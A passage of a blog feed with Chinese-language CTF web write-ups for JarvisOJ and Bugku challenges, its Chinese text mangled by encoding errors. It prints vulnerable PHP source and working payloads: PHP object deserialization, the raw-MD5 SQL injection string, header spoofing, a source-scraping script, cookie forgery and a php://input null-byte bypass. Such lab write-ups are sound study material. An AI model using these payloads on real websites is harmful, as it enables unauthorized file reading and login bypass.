src="/2019/10/05/jarvisoj-web-wp/20191210222517.png"></p><p>çŒœæµ‹imgä¼ çš„ä¸œè¥¿æ˜¯base64åŠ å¯†çš„ï¼Œè§£å¯†ä»¥ä¸‹å‘ç°æ˜¯<code>shield.jpg</code>ï¼Œæ¢æˆå…¶ä»–<code>/etc/passwd</code>å‘ç°ä¸è¡Œï¼Œå°è¯•åŒ…å«<code>index.php</code>,<code>showimg.php</code>,<code>shield.php</code></p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; $g = $_GET[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>showing.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">&amp;&amp; stripos($f,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shield.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“flagåœ¨<code>pctf.php</code>ä¸­ï¼Œä½†è¿‡æ»¤äº†pctfï¼Œä¸èƒ½ç›´æ¥åŒ…å«<code>pctf.php</code></p><p><strong>æ„é€ ååºåˆ—åŒ–åºåˆ—ï¼š</strong></p><p><img src="/2019/10/05/jarvisoj-web-wp/20191210223726.png"></p><p>payload:</p><pre><code>index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></pre><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191210224319.png"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805145436.png"></p><p>å¥½åƒæ²¡ä»€ä¹ˆæ€è·¯å•Šï¼ŒæŠ“åŒ…çœ‹çœ‹å§</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805145633.png"></p><p>çœ‹åˆ°å“åº”å¤´ä¸­æœ‰ä¸ªæç¤º</p><pre><code>&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></pre><p><strong>md5()å‡½æ•°</strong>æœ‰ä¸¤ä¸ªå‚æ•°</p><p>å‚æ•°ä¸€æ˜¯è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼›</p><p>å‚æ•°äºŒæ˜¯è¾“å‡ºæ ¼å¼ï¼šä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºè¾“å‡ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›<br>é»˜è®¤ä¸ºfalseï¼Œè¡¨ç¤ºè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚</p><p>çœ‹åˆ°æç¤ºç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ³¨å…¥,å¯æ˜¯å¦‚ä½•é—­åˆsqlè¯­å¥å‘¢ï¼Ÿå¦‚æœæ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†åå¾—åˆ°çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼åœ¨SQLä¸­æ‹¼æ¥æˆ ç±»ä¼¼ â€˜orâ€™xxxçš„å½¢å¼å°±å¯ä»¥ç»•è¿‡äº†</p><p>å°†<code>ffifdyop</code>æäº¤flagå°±å‡ºæ¥äº†</p><pre><code>PCTF&#123;R4w_md5_is_d4ng3rous&#125;</code></pre><h2 id="LOCALHOST-1"><a href="#LOCALHOST-1" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p><p>ä»…æœ¬æœºè®¿é—®ï¼Œç«‹åˆ»æƒ³åˆ°æŠ“åŒ…æ”¹XFF</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p><p>flagå°±è¿™æ ·å‡ºæ¥äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå°±æ˜¯è¿™æ ·ç®€å•</p><pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</code></pre><h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€å¯ä»¥å‘ç°ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805141505.png"></p><p>å®ƒè®©æˆ‘ä»¬ç”¨51ç«¯å£è®¿é—®è¿™ä¸ªç½‘å€</p><p>çœ‹å…¶ä»–å¤§ä½¬çš„wpç”¨çš„æ˜¯curlå‘½ä»¤ï¼Œæ‰“å¼€è™šæ‹Ÿæœºå’±ä¹Ÿè¯•ä¸‹å§</p><pre><code>curl â€“local-port http://web.jarvisoj.com:32770/</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20190805143017.png"></p><p>ç¥é­”æƒ…å†µï¼Ÿåˆçœ‹äº†çœ‹å‡ ä½å¤§ä½¬çš„åšå®¢ï¼Œè¯´æ˜¯å¿…é¡»è¦ç”¨å…¬ç½‘IPçš„ä¸»æœºæ‰è¡Œã€‚ä¸å¤ªæ­»å¿ƒï¼Œåˆè¯•äº†è¯•cmdé‡Œçš„ï¼Œæœç„¶è¿˜æ˜¯ä¸è¡Œã€‚</p><p>æŸ¥çœ‹äº†ä¼—å¤šå¤§ä½¬çš„åšå®¢åå¾—å‡ºçš„åŸå› å¥½åƒæ˜¯ï¼šæœ¬åœ°ç§æœ‰åœ°å€ä»ä»£ç†æœåŠ¡å™¨å‡ºå»åï¼Œä½¿ç”¨çš„æ˜¯ä»£ç†æœåŠ¡å™¨çš„ç«¯å£ï¼Œè¿™ä¸ªç«¯å£å¾€å¾€ä¸ä¼šæ˜¯51ï¼Œæˆ‘ç”¨çš„æ˜¯æ ¡å›­ç½‘ï¼Œè™šæ‹Ÿæœºä¹Ÿæ˜¯ç»è¿‡ä¸»æœºèµ°çš„æ ¡å›­ç½‘ï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚</p><p>æ²¡åŠæ³•åªèƒ½æŠ„åˆ«äººçš„flagäº†</p><pre><code>PCTF&#123;M45t3r_oF_CuRl&#125;    </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> jarvisoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku webéƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2019/10/01/bugku-web-partquestion/"/>
      <url>2019/10/01/bugku-web-partquestion/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸­webéƒ¨åˆ†é¢˜çš„writeup,æ„Ÿè§‰è¿™äº›é¢˜è‡ªå·±æ”¶è·è¿˜æŒºå¤šçš„ï¼ŒåŒ…æ‹¬ä»¥ä¸‹é¢˜ç›®ï¼š</p><ol><li>cookiesæ¬ºéª—</li><li>welcome to bugkuctf<a id="more"></a></li></ol><h2 id="cookiesæ¬ºéª—"><a href="#cookiesæ¬ºéª—" class="headerlink" title="cookiesæ¬ºéª—"></a>cookiesæ¬ºéª—</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915152012.png"></p><pre><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre><p>ä¼šè‡ªåŠ¨è·³è½¬åˆ°è¿™ä¸ªurl,<code>a2V5cy50eHQ=</code>å¾ˆæƒ³base64åŠ å¯†åçš„ç»“æœï¼Œè§£å¯†ä¸€ä¸‹å‘ç°è§£å¯†ç»“æœä¸º<code>keys.txt</code>ï¼Œæ˜¾ç„¶filenameè¿™ä¸ªå‚æ•°ä¼ çš„æ˜¯æ–‡ä»¶åå­—base64åŠ å¯†åçš„ç»“æœï¼Œæ˜¯å¦å¯ä»¥ä¼ è¾“index.phpåŠ å¯†çš„ç»“æœå‘¢ï¼Ÿ</p><p>index.phpç»base64åŠ å¯†åä¸º<code>aW5kZXgucGhw</code>ï¼Œè¯•ç€è®¿é—®ä¸€ä¸‹</p><pre><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</code></pre><p>å‘ç°å†…å®¹ä¸ºç©ºç™½ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ‰ä¸ª</p><pre><code>&lt;?php</code></pre><p>å°†line=2å‘ç°</p><pre><code>$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</code></pre><p>çœ‹æ¥æ€è·¯å¯¹äº†ï¼Œlineä»£è¡¨çš„å°±æ˜¯è¡Œæ•°ï¼Œå†™ä¸ªè„šæœ¬çœ‹ä¸‹å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">urls&#x3D;[&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#123;&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot;.format(str(i))for i in range(100)]</span><br><span class="line">li&#x3D;&quot;&quot;</span><br><span class="line">for url in urls:</span><br><span class="line">    r&#x3D;requests.get(url)</span><br><span class="line">    if r.status_code&#x3D;&#x3D;200:</span><br><span class="line">        li+&#x3D;(r.text)</span><br><span class="line">print(li)</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸çŸ¥é“æœ‰å¤šå°‘è¡Œä»£ç ï¼Œå…ˆè®¾æˆ100å§ï¼Œè·‘ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿä»£ç å¯çŸ¥éœ€è¦è®¾ç½®Cookie,è¿˜æœ‰ä¸ªç‰¹æ®Šæ–‡ä»¶<code>keys.php</code>,å¯èƒ½flagå°±åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶åbase64åŠ å¯†åæ˜¯<code>a2V5cy5waHA=</code></p><p><code>in_array()</code>å‡½æ•°ç”¨äºæœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ï¼ŒæŠ“åŒ…çœ‹ä¸‹</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915160225.png"></p><pre><code>payload:/web11/index.php?line=&amp;filename=a2V5cy5waHA=è®¾ç½®Cookie: margin=margin</code></pre><p>å¾—åˆ°flag</p><pre><code>KEY&#123;key_keys&#125;</code></pre><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>æ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915160754.png"></p><p>å¥½åƒæ²¡ä»€ä¹ˆæ€è·¯ï¼ŒæŠ“åŒ…çœ‹çœ‹å§</p><p>è®¿é—®<code>/test/hello.php</code>ä¼šè·³è½¬åˆ°<code>/test/hello.php?id=1</code>ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æœ‰ä¸ª<code>1p.html</code>ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915161240.png"></p><p>å‘ç°ï¼Œä¸æŠ“åŒ…çš„è¯ä¼šè·³è½¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">var Words &#x3D;&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; </span><br><span class="line">function OutWord()</span><br><span class="line">&#123;</span><br><span class="line">var NewWords;</span><br><span class="line">NewWords &#x3D; unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line">&#x2F;&#x2F; --&gt;</span><br></pre></td></tr></table></figure><p>Wordsä¸­é—´å¥½åƒæœ‰urlç¼–ç ï¼Œhackbarè§£ç å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt;</span><br></pre></td></tr></table></figure><p>åˆçœ‹åˆ°å…¶ä¸­å¾ˆåƒbase64ï¼Œè§£ç å¾—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>å¥½åƒè¿˜æ˜¯urlç¼–ç ï¼Œå†è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;no no no no no no no&#39;;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">    require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸ªf4l2a3g.txtï¼Œç›´æ¥è®¿é—®å¯ä»¥å¾—åˆ°flag</p><pre><code>flag&#123;tHis_iS_THe_fLaG&#125;</code></pre><p>é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡</p><pre><code>payload:/test/hello.php?id=0easad&amp;b=%00adssadsa&amp;a=php://inputpostè¿‡å»ï¼šbugku is a nice plateform!phpä¼šé»˜è®¤è®¤ä¸º0eå¼€å¤´çš„å¼±ç­‰äº0</code></pre><p><code>eregi()</code>å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²</p><pre><code>int eregi(string pattern, string string, [array regs]);</code></pre><p>å­˜åœ¨%00æˆªæ–­æ¼æ´ï¼Œå³%00åé¢çš„å†…å®¹ä¸è§£æ</p><p><code>substr()</code>å‡½æ•°ç”¨äºè¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> bugku </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugkuä»£ç å®¡è®¡writeup</title>
      <link href="2019/09/29/bugku-codecheck-wp/"/>
      <url>2019/09/29/bugku-codecheck-wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸Šwebä»£ç å®¡è®¡éƒ¨åˆ†çš„writeup!</p><a id="more"></a><h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><p>é¢˜ç›®ç»™å‡ºçš„æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET); </span><br><span class="line">if(isset($shiyan)) </span><br><span class="line">&#123; </span><br><span class="line"> $content&#x3D;trim(file_get_contents($flag)); </span><br><span class="line"> if($shiyan&#x3D;&#x3D;$content)</span><br><span class="line">  &#123; </span><br><span class="line">   echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">  &#125; </span><br><span class="line"> else </span><br><span class="line">  &#123;</span><br><span class="line">   echo&#39;Oh.no&#39;;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span 